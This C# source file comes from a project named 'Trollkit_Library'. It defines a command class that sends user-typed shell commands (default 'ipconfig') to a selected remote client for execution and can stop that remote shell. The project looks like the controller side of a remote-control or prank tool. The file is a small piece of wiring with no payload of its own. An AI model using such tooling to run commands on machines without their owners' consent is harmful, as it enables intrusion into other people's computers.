using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Input;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;
using Trollkit_Library.ServerModules;

namespace Trollkit_Library.ViewModels.Commands
{
	public class CMDCommands
	{
		private readonly Server _server;
		private readonly string handler;

		public ICommand SendCMD { get { return new SendServerCommand(SendCMDToClient); } }
		public ICommand Close { get { return new SendServerCommand(CloseCMD); } }

		public string CommandText { get; set; }

		public CMDCommands(Server server, string handler)
		{
			_server = server;
			this.handler = handler;

			CommandText = "ipconfig";
		}

		public void SendCMDToClient()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "ExecuteCMD", Handler = handler, Value = CommandText };
			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
		}


		public void CloseCMD()
		{
			TransferCommandObject returnObject = new TransferCommandObject { Command = "StopCMD", Handler = handler };
			_server.SendDataObjectToSelectedClient(Server.DataByteType.Command, ClientServerPipeline.BufferSerialize(returnObject));
		}
	}
}
